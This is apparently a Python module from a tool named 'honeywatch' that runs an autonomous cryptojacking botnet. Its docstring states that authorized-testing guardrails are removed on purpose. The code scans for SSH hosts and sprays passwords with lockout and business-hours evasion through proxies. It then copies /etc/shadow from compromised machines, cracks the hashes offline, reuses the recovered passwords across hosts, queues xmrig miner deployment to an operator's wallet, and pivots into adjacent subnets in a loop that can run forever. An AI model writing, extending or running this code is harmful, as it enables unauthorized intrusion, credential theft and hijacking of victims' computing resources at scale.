"""Autonomous cryptojacker chain orchestrator for honeywatch.

This is the kill-chain engine that turns honeywatch from a tool collection
into a self-running botnet. It ports NetAttackAI's phase + capability model
but drops the authorized-testing guardrails: no scope gate, no read-only
default, business-hours + source-rotation opsec baked in, and it loops on
*growth* -- every pivot that surfaces new hosts feeds back into enumeration.

The chain (each phase consumes artifacts the previous phase produced, kept in
the shared SQLite store so a killed run resumes from what's already known):

    recon        scan + score real SSH hosts              -> hosts
    enumerate    auth-method precheck on real hosts       -> sprayable hosts
    spray        lockout-safe password spray              -> credentials
    foothold     verify a cred by grabbing /etc/shadow    -> footholds
    escalate     offline hashcrack of grabbed shadows     -> more credentials
    persist      deploy xmrig via cracked passwords       -> deployed fleet
    pivot        discover adjacent subnets from footholds  -> new hosts -> loop

State lives in :class:`ChainState`; the store is the durable backing. The
orchestrator never raises -- a phase that fails records its error and the
chain continues to the next phase (a dead scanner should not kill a foothold
you already have).
"""

from __future__ import annotations

import asyncio
import ipaddress
import socket
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable

from honeywatch.opsec import ProxyPool

__all__ = [
    "ChainConfig",
    "ChainPhase",
    "ChainState",
    "ChainOrchestrator",
    "run_chain",
]


class ChainPhase(str, Enum):
    ROUND = "round"   # meta: round delimiter, not a network phase
    RECON = "recon"
    ENUMERATE = "enumerate"
    SPRAY = "spray"
    FOOTHOLD = "foothold"
    ESCALATE = "escalate"
    PERSIST = "persist"
    PIVOT = "pivot"


@dataclass
class ChainConfig:
    """Operator inputs that drive one autonomous run."""

    # Targets for the recon phase (CIDRs / IPs). If empty, recon is skipped and
    # the chain works off whatever the store already holds (resume / pivot-only).
    targets: list[str] = field(default_factory=list)
    scan_tool: str = "masscan"
    scan_rate: int | None = None
    max_hosts: int | None = None

    # Spray population.
    users: list[str] = field(default_factory=list)
    user_file: str | None = None
    passwords: list[str] = field(default_factory=list)
    password_file: str | None = None
    # Deploy payload (cryptojacker). The chain only *enqueues* operations; a
    # separately-launched `honeywatch worker` picks up the tasks and executes
    # them, so the worker's --exec-mode (not the chain's) governs how a deploy
    # actually runs.
    payload_id: str = "xmrig"
    pool: str = ""
    wallet: str = ""
    worker: str = "honeywatch"
    threads: int = 0
    tls: bool = False
    evasion: list[str] = field(default_factory=list)

    # Offline hash cracking.
    hashcrack_wordlist: str = ""  # empty = use bundled default
    hashcrack_tool: str = "hashcat"

    # Opsec knobs (threaded into every network-touching phase).
    business_hours: bool = False
    proxy_file: str | None = None
    jump_file: str | None = None
    delay: float = 0.0
    jitter: float = 0.5
    lockout_delay: float = 0.0
    host_concurrency: int = 8
    min_confidence: float = 0.7
    target_labels: set[str] = field(default_factory=lambda: {"real", "likely_real"})

    # Loop control.
    max_rounds: int = 3
    skip_vpn_check: bool = False

    # Operator config TOML, threaded into recon's load_config so scan tuning
    # from config.toml (ports, AI, scanner opts) is honored through the chain,
    # not just via `honeywatch scan`. None = env / ./config.toml / defaults.
    config_path: str | None = None

    # Where recovered shadows land + where pivots read from.
    db_path: str = "honeywatch.db"
    shadow_stash: str = ".honeywatch/shadow_stash"


@dataclass
class ChainState:
    """Live state threaded across phases; the store is the durable backing."""

    round: int = 0
    hosts: list[tuple[str, int]] = field(default_factory=list)        # discovered
    sprayable: list[tuple[str, int]] = field(default_factory=list)    # password-auth
    credentials: list[dict] = field(default_factory=list)             # recovered
    footholds: list[tuple[str, int, str, str]] = field(default_factory=list)  # ip,port,user,pass
    # Targets with a deploy task queued in the C2 store this run. The chain
    # cannot know synchronous deploy outcome -- that is the worker's job -- so
    # this is honestly "enqueued", not "deployed".
    enqueued: list[tuple[str, int]] = field(default_factory=list)
    # Every subnet the chain has pivoted into across all rounds (accumulates).
    pivoted_subnets: list[str] = field(default_factory=list)
    log: list[dict] = field(default_factory=list)
    stopped: bool = False
    stop_reason: str = ""

    def note(self, phase: ChainPhase, msg: str, **extra) -> None:
        self.log.append({"phase": phase.value, "msg": msg, "round": self.round, **extra})


# --------------------------------------------------------------------------- #
# Small SSH exec helper (used by foothold verification + pivot discovery)
# --------------------------------------------------------------------------- #


def _ssh_exec(
    ip: str, port: int, user: str, password: str | None, key_path: str | None,
    command: str, timeout_s: float = 15.0,
) -> tuple[int | None, str, str | None]:
    """Run one command on a host via paramiko. Returns (rc, stdout, error)."""
    try:
        import paramiko  # type: ignore[import-not-found]
    except Exception as exc:
        return None, "", f"paramiko unavailable: {exc!r}"
    transport = None
    try:
        transport = paramiko.Transport((ip, port))
        transport._CLIENT_IDENTITY = "SSH-2.0-OpenSSH_9.0p1 Debian-1"
        transport.local_version = "SSH-2.0-OpenSSH_9.0p1 Debian-1"
        # set_timeout governs the banner exchange + auth window so a host that
        # accepts the TCP connect but never finishes the SSH handshake cannot
        # hang the foothold/pivot phase indefinitely.
        transport.set_timeout(timeout_s)
        transport.start_client(timeout=timeout_s)
        if key_path:
            pkey = paramiko.RSAKey.from_private_key_file(key_path)
            transport.auth_publickey(user, pkey)
        else:
            transport.auth_password(user, password or "")
        chan = transport.open_session()
        chan.settimeout(timeout_s)
        chan.exec_command(command)
        out = b""
        err = b""
        # Drain BOTH stdout and stderr until the channel closes. Reading only
        # stdout deadlocks a command that writes more than the pipe buffer to
        # stderr: the remote process blocks on a full stderr buffer while we sit
        # waiting on a stdout stream that never grows. Poll both streams against
        # an overall deadline so a hung command is cut off rather than looping.
        deadline = time.monotonic() + timeout_s
        while True:
            got = False
            if chan.recv_ready():
                out += chan.recv(4096)
                got = True
            if chan.recv_stderr_ready():
                err += chan.recv_stderr(4096)
                got = True
            if (chan.exit_status_ready()
                    and not chan.recv_ready()
                    and not chan.recv_stderr_ready()):
                break
            if not got:
                if time.monotonic() > deadline:
                    break
                time.sleep(0.01)
        rc = chan.recv_exit_status()
        text = out.decode("utf-8", "replace")
        if err:
            text += "\n[stderr]\n" + err.decode("utf-8", "replace")
        return rc, text, None
    except Exception as exc:
        return None, "", f"{type(exc).__name__}: {exc}"
    finally:
        if transport is not None:
            try:
                transport.close()
            except Exception:
                pass


def _adjacent_subnets(interfaces_text: str) -> list[str]:
    """Parse `ip -o -4 addr` (or `ifconfig`) output into /24s the host sits on.

    The pivot command is ``ip -o -4 addr || ifconfig``, so this must handle both
    shapes: modern ``ip`` (``inet 10.0.0.5/24 ...``) and the two ``ifconfig``
    forms — new (``inet 10.0.0.5 netmask ...``) and legacy net-tools
    (``inet addr:10.0.0.5  Bcast:...  Mask:...``).
    """
    nets: list[str] = []
    for line in interfaces_text.splitlines():
        # format: "2: eth0    inet 10.0.0.5/24 brd ... scope global eth0"
        if " inet " not in line:
            continue
        try:
            inet_part = line.split(" inet ", 1)[1].split()[0]
            # Legacy ifconfig: "inet addr:10.0.0.5" -> first token is "addr:10.0.0.5".
            if inet_part.startswith("addr:"):
                inet_part = inet_part[len("addr:"):]
            ip_cidr = inet_part.split("/")[0]
        except (IndexError, ValueError):
            continue
        if ip_cidr.startswith(("127.", "169.254.")):
            continue
        # Pivot on a /24 chunk of the host's address only -- scanning a whole
        # /16 or /8 from a foothold is far too loud. Keeps pivots tight. Emit
        # the canonical network base (10.0.0.0/24), not the host IP, so recon
        # targets read clean and de-dup is exact across rounds.
        try:
            net = ipaddress.ip_network(f"{ip_cidr}/24", strict=False)
        except ValueError:
            continue
        nets.append(str(net))
    # de-dup, keep order
    seen: set[str] = set()
    out: list[str] = []
    for n in nets:
        if n not in seen:
            seen.add(n)
            out.append(n)
    return out


# --------------------------------------------------------------------------- #
# Orchestrator
# --------------------------------------------------------------------------- #


class ChainOrchestrator:
    """Runs the autonomous cryptojacker chain, looping on growth."""

    def __init__(self, config: ChainConfig, on_phase: Callable | None = None):
        self.cfg = config
        self.state = ChainState()
        self.on_phase = on_phase
        self.pool = ProxyPool.from_files(proxy_file=config.proxy_file,
                                         jump_file=config.jump_file)

    # -- helpers -----------------------------------------------------------
    def _emit(self, phase: ChainPhase, msg: str, **extra) -> None:
        self.state.note(phase, msg, **extra)
        if self.on_phase:
            try:
                self.on_phase(phase, msg, self.state, **extra)
            except Exception:
                pass

    def _store(self):
        from honeywatch.store import Store
        return Store(self.cfg.db_path)

    # -- phases ------------------------------------------------------------
    def phase_recon(self) -> None:
        self._emit(ChainPhase.RECON, f"scanning {len(self.cfg.targets)} target(s)")
        if not self.cfg.targets:
            self._emit(ChainPhase.RECON, "no targets; working off stored hosts")
            return
        from honeywatch.config import load_config
        from honeywatch.pipeline import Pipeline

        cfg = load_config(self.cfg.config_path)
        store = self._store()
        pipeline = Pipeline(cfg, store=store)
        try:
            scores = asyncio.run(pipeline.scan(
                targets=list(self.cfg.targets),
                tool=self.cfg.scan_tool,
                rate=self.cfg.scan_rate or 1000,
                max_hosts=self.cfg.max_hosts,
                skip_vpn_check=self.cfg.skip_vpn_check,
            ))
            self._emit(ChainPhase.RECON, f"scored {len(scores)} hosts")
        except Exception as exc:
            self._emit(ChainPhase.RECON, f"recon failed: {type(exc).__name__}: {exc}")

    def phase_enumerate(self) -> None:
        store = self._store()
        rows = store.query(limit=100000, min_confidence=self.cfg.min_confidence)
        hosts = [(r["ip"], int(r["port"])) for r in rows
                 if (r.get("label") in self.cfg.target_labels)]
        # de-dup
        seen: set = set()
        self.state.hosts = [h for h in hosts if not (h in seen or seen.add(h))]
        self._emit(ChainPhase.ENUMERATE, f"{len(self.state.hosts)} real/likely hosts")

        from honeywatch.opsec import auth_methods

        probe_user = self.cfg.users[0] if self.cfg.users else "root"
        # Concurrent auth-method precheck: serial probing is the bottleneck on
        # planet-scale host lists (every other network phase is already
        # concurrent). auth_methods never raises, so gather is safe. Bound the
        # fan-out with host_concurrency so a million-host enumerate doesn't
        # try to hand a million threads to the default executor at once.
        if self.state.hosts:
            sem = asyncio.Semaphore(max(1, self.cfg.host_concurrency))

            async def _probe_all():
                async def _one(ip: str, port: int):
                    async with sem:
                        return await asyncio.to_thread(
                            auth_methods, ip, port, probe_user
                        )

                return await asyncio.gather(
                    *(_one(ip, port) for ip, port in self.state.hosts)
                )
            ams = asyncio.run(_probe_all())
        else:
            ams = []
        sprayable: list[tuple[str, int]] = []
        for (ip, port), am in zip(self.state.hosts, ams):
            if am.offers_password:
                sprayable.append((ip, port))
            # unreachable hosts stay in `hosts` but aren't sprayable
        self.state.sprayable = sprayable
        self._emit(ChainPhase.ENUMERATE,
                   f"{len(sprayable)} hosts offer password auth "
                   f"({len(self.state.hosts) - len(sprayable)} skipped)")

    def phase_spray(self) -> None:
        if not self.state.sprayable:
            self._emit(ChainPhase.SPRAY, "no sprayable hosts; skipping")
            return
        from honeywatch.spray import SprayHost, spray_targets
        store = self._store()

        users = self.cfg.users or self._load_users()
        passwords = self.cfg.passwords or self._load_passwords() or \
            ["Summer2024!", "Winter2024!", "Changeme123", "Welcome1"]

        # Fleet growth (round >= 2): re-spray every recovered password across
        # the current sprayable set. Password reuse across a fleet is the
        # blackhat growth primitive -- a cred cracked on one box often opens
        # others. Mirrors `honeywatch spray --reuse-creds`.
        if self.state.round > 1:
            recovered = {c.get("password")
                         for c in store.query_credentials(limit=100000)
                         if c.get("password")}
            recovered -= set(passwords)
            if recovered:
                passwords = list(recovered) + list(passwords)
                self._emit(ChainPhase.SPRAY,
                           f"reuse-creds: {len(recovered)} recovered password(s) prepended")

        hosts = [SprayHost(ip=ip, port=port, users=list(users))
                 for ip, port in self.state.sprayable]
        all_creds: list[dict] = []
        for pw in passwords:
            self._emit(ChainPhase.SPRAY, f"round password={pw!r} against "
                       f"{len(hosts)} host(s)")
            res = spray_targets(
                password=pw, hosts=hosts, delay=self.cfg.delay,
                jitter=self.cfg.jitter, lockout_delay=self.cfg.lockout_delay,
                business_hours=self.cfg.business_hours,
                host_concurrency=self.cfg.host_concurrency,
                proxy_file=self.cfg.proxy_file, jump_file=self.cfg.jump_file,
            )
            for r in res:
                if r.success:
                    cred = {"ip": r.ip, "port": r.port, "user": r.user,
                            "password": r.password}
                    all_creds.append(cred)
                    store.upsert_credential(
                        r.ip, r.port, r.user or "", r.password,
                        attempts=r.attempts, source="chain-spray")
        # Accumulate unique credentials across rounds.
        seen = {(c["ip"], c["port"], c["user"], c["password"]) for c in self.state.credentials}
        for c in all_creds:
            key = (c["ip"], c["port"], c["user"], c["password"])
            if key not in seen:
                self.state.credentials.append(c)
                seen.add(key)
        self._emit(ChainPhase.SPRAY, f"recovered {len(all_creds)} credential(s) this round "
                   f"({len(self.state.credentials)} total)")

    def phase_foothold(self) -> None:
        """Verify each recovered cred by actually grabbing /etc/shadow."""
        from honeywatch.hashcrack import grab_shadow

        creds = self._store().query_credentials(limit=100000)
        # Accumulate unique footholds across rounds (de-dup by ip,port,user) so
        # the chain summary reflects the whole run, not just the last round.
        existing = {(f[0], f[1], f[2]) for f in self.state.footholds}
        footholds: list[tuple[str, int, str, str]] = list(self.state.footholds)
        for c in creds:
            ip, port, user, pw = c["ip"], int(c["port"]), c["user"], c.get("password")
            if not (user and pw):
                continue
            # Already confirmed in an earlier round -- never re-grab. Re-SFTPing
            # /etc/shadow from a box you already own is pure target-side noise.
            if (ip, port, user) in existing:
                continue
            grab = grab_shadow(ip, port, user, pw, stash_dir=self.cfg.shadow_stash)
            if grab.get("shadow_path"):
                footholds.append((ip, port, user, pw))
                self._emit(ChainPhase.FOOTHOLD, f"foothold confirmed {ip}:{port} ({user})")
            elif grab.get("error"):
                # auth worked for spray but not for shadow read (non-root); still
                # a usable shell even if /etc/shadow is denied.
                rc, out, err = _ssh_exec(ip, port, user, pw, None, "id")
                if rc == 0:
                    footholds.append((ip, port, user, pw))
                    self._emit(ChainPhase.FOOTHOLD, f"foothold (shell only) {ip}:{port}")
        self.state.footholds = footholds
        self._emit(ChainPhase.FOOTHOLD, f"{len(footholds)} foothold(s)")

    def phase_escalate(self) -> None:
        """Offline-hashcrack every grabbed shadow -> more creds."""
        if not self.state.footholds:
            self._emit(ChainPhase.ESCALATE, "skipping (no footholds)")
            return
        from honeywatch.crack import default_wordlist_path
        from honeywatch.hashcrack import crack_shadow

        wordlist = self.cfg.hashcrack_wordlist or default_wordlist_path()

        store = self._store()
        new_creds = 0
        seen = {(c["ip"], c["port"], c["user"], c["password"])
                for c in self.state.credentials}
        for ip, port, user, pw in self.state.footholds:
            stash = f"{self.cfg.shadow_stash}/{ip}/shadow"
            try:
                import os
                if not os.path.isfile(stash):
                    continue
            except OSError:
                continue
            res = crack_shadow(stash, wordlist,
                               tool=self.cfg.hashcrack_tool)
            for c in res.credentials():
                store.upsert_credential(
                    ip, port, c["user"], c["password"], attempts=1,
                    source="chain-hashcrack")
                new_creds += 1
                cred = {"ip": ip, "port": port, "user": c["user"],
                        "password": c["password"]}
                key = (cred["ip"], cred["port"], cred["user"], cred["password"])
                if key not in seen:
                    self.state.credentials.append(cred)
                    seen.add(key)
        self._emit(ChainPhase.ESCALATE, f"offline-cracked {new_creds} new credential(s) "
                   f"({len(self.state.credentials)} total)")

    def phase_persist(self) -> None:
        """Deploy the cryptojacker payload onto every foothold."""
        if not self.state.footholds:
            self._emit(ChainPhase.PERSIST, "no footholds; skipping deploy")
            return
        from honeywatch.c2.store import C2Store
        from honeywatch.models import Target
        from honeywatch.ops import build_manifest, enqueue_operation

        if self.cfg.payload_id in {"xmrig", "xmrigcc"}:
            missing = [k for k in ("pool", "wallet") if not getattr(self.cfg, k)]
            if missing:
                flags = ", ".join(f"--{k}" for k in missing)
                self._emit(
                    ChainPhase.PERSIST,
                    f"ABORT: miner deploy needs {flags} "
                    f"(configure via `honeywatch setup` or pass {flags})",
                )
                return

        targets: list[Target] = []
        for ip, port, user, pw in self.state.footholds:
            targets.append(Target(
                ip=ip, port=port, label="real", confidence=1.0,
                allowed_categories=["miner"], ssh_user=user, ssh_pass=pw,
            ))
        variables = {
            "pool": self.cfg.pool, "wallet": self.cfg.wallet,
            "worker": self.cfg.worker, "threads": str(self.cfg.threads),
            "tls": str(self.cfg.tls).lower(),
        }
        try:
            manifest = build_manifest(self.cfg.payload_id, targets, variables,
                                      apply_evasion=self.cfg.evasion or None)
            c2 = C2Store(self.cfg.db_path)
            op = enqueue_operation(c2, manifest)
            # The chain only enqueues; a separately-launched `honeywatch worker`
            # picks up the tasks and executes them (its own --exec-mode). Track
            # what we queued, not what has run -- we cannot know the latter
            # synchronously. Accumulate unique (ip, port) across rounds so the
            # run summary reflects everything queued, not just the last round.
            seen_q = set(self.state.enqueued)
            for t in targets:
                key = (t.ip, t.port)
                if key not in seen_q:
                    self.state.enqueued.append(key)
                    seen_q.add(key)
            self._emit(ChainPhase.PERSIST,
                       f"enqueued {op.id}: {len(targets)} deploy task(s) "
                       f"(worker executes async)")
        except Exception as exc:
            self._emit(ChainPhase.PERSIST, f"deploy failed: {type(exc).__name__}: {exc}")

    def phase_pivot(self) -> None:
        """Discover adjacent subnets from each foothold; feed them to recon."""
        if not self.state.footholds:
            self._emit(ChainPhase.PIVOT, "no footholds to pivot from")
            return
        new_nets: list[str] = []
        for ip, port, user, pw in self.state.footholds:
            rc, out, err = _ssh_exec(ip, port, user, pw, None,
                                     "ip -o -4 addr 2>/dev/null || ifconfig 2>/dev/null")
            if rc == 0 and out:
                nets = _adjacent_subnets(out)
                new_nets.extend(nets)
                if nets:
                    self._emit(ChainPhase.PIVOT, f"{ip} sits on {', '.join(nets)}")
        # de-dup this round's nets, excluding anything already pivoted into in
        # a prior round so we never re-scan a subnet we've already touched.
        seen: set = set(self.state.pivoted_subnets)
        unique = [n for n in new_nets if not (n in seen or seen.add(n))]
        # Accumulate every subnet the chain has pivoted into across all rounds.
        self.state.pivoted_subnets = list(self.state.pivoted_subnets) + unique
        # Convert discovered /24s into the next recon's target list.
        self.cfg.targets = unique
        self._emit(ChainPhase.PIVOT, f"{len(unique)} new subnet(s) queued for recon "
                   f"({len(self.state.pivoted_subnets)} total pivoted)")

    # -- loaders -----------------------------------------------------------
    def _load_users(self) -> list[str]:
        from honeywatch.crack import default_users
        users = list(self.cfg.users)
        if self.cfg.user_file:
            try:
                with open(self.cfg.user_file, "r", encoding="utf-8") as fh:
                    users += [u.strip() for u in fh if u.strip() and not u.startswith("#")]
            except OSError:
                pass
        return users or default_users()

    def _load_passwords(self) -> list[str]:
        passwords = list(self.cfg.passwords)
        if self.cfg.password_file:
            try:
                with open(self.cfg.password_file, "r", encoding="utf-8") as fh:
                    passwords += [p.strip() for p in fh if p.strip() and not p.startswith("#")]
            except OSError:
                pass
        return passwords

    # -- loop --------------------------------------------------------------
    def run(self) -> ChainState:
        """Run the full chain, pivoting up to max_rounds.

        ``max_rounds=0`` runs forever (a true unattended daemon) until growth
        exhausts -- a pivot round that finds no new subnets. ``max_rounds=N``
        caps it at N rounds.
        """
        round_n = 0
        while self.cfg.max_rounds == 0 or round_n < self.cfg.max_rounds:
            round_n += 1
            self.state.round = round_n
            self._emit(ChainPhase.ROUND, f"=== round {round_n} ===")
            self.phase_recon()
            self.phase_enumerate()
            self.phase_spray()
            self.phase_foothold()
            self.phase_escalate()
            self.phase_persist()
            self.phase_pivot()
            if not self.cfg.targets:
                self.state.stopped = True
                self.state.stop_reason = "no new pivot subnets; growth exhausted"
                break
        else:
            self.state.stopped = True
            self.state.stop_reason = f"reached max_rounds={self.cfg.max_rounds}"
        return self.state


def run_chain(config: ChainConfig, on_phase: Callable | None = None) -> ChainState:
    """Build an orchestrator and run it. Convenience entry point."""
    return ChainOrchestrator(config, on_phase=on_phase).run()